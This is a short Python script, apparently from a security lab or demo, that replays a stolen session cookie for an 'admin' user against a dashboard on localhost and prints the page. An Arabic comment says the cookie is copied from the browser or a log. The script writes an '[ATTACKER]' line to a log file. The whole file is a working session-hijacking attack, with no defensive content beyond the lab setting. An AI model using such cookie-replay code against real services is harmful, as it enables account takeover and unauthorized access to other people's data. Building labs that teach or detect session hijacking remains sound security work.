import requests

TARGET = "http://127.0.0.1:5000/dashboard"

# Session ID المسروق (نسخه من المتصفح أو اللوج)
cookies = {
    "session": "eyJ1c2VyIjoiYWRtaW4ifQ.aXnIMw.eLLVPKNq-M-fBur88Z256xR4XMc"
}

r = requests.get(TARGET, cookies=cookies)

with open("logs.txt", "a") as f:
    f.write("[ATTACKER] Reused stolen session cookie\n")

print(r.text)
